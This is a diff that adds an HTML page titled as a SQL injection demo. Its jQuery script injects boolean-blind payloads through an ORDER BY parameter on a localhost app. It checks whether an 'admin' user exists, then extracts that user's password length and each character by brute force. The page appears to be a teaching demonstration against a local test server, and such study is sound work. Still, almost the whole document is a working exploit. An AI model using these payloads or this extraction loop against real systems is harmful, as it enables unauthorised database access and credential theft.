@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>SQL injection demo - ORDER BY</title>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
+</head>
+<body>
+  <script>
+
+      console.log('Starting');
+
+      function ask(question) {
+        var result;
+        var response = $.ajax({url:'http://localhost:8080/sql/list?orderBy=IF('+question+',name,price)', async: false}).done(function (data) {
+          var firstRow = $(data).find('tbody tr td');
+          var answer = $(firstRow[3]).text() == '2,400';
+          console.log(question, '=', answer);
+          result = answer;
+        });
+        return result;
+      }
+
+      ask('1<2');
+      ask('4=3');
+      ask('4=4');
+
+      ask('EXISTS(SELECT * FROM USERS WHERE USERNAME=\'admin\')');
+
+//      var passwordLength = passwordLength();
+      function passwordLength() {
+        var passwordLength = 0;
+        while (passwordLength++ < 100) {
+          var yes = ask('((SELECT LENGTH(PASSWORD) FROM USERS WHERE USERNAME=\'admin\') = ' + passwordLength + ')');
+          if (yes) {
+            console.log('Admin password length: ', passwordLength);
+            break;
+          }
+        }
+        return passwordLength;
+      }
+
+//      password(passwordLength);
+
+      function password(passwordLength) {
+        var password = [];
+        for (var j = 1; j <= passwordLength; j++) {
+          var charCode = 0;
+          while (charCode++ < 255) {
+            var yes = ask('((SELECT substr(PASSWORD,' + j + ',1) FROM USERS WHERE USERNAME=\'admin\') = CHAR(' + charCode + '))');
+//            var yes = ask('((SELECT BINARY substr(PASSWORD,' + j + ',1) FROM USERS WHERE USERNAME=\'admin\') = CHAR(' + charCode + '))');
+            if (yes) {
+              password[j] = String.fromCharCode(charCode);
+              console.log('Admin password = ', password);
+              break;
+            }
+          }
+        }
+      }
+  </script>
+</body>
+</html>
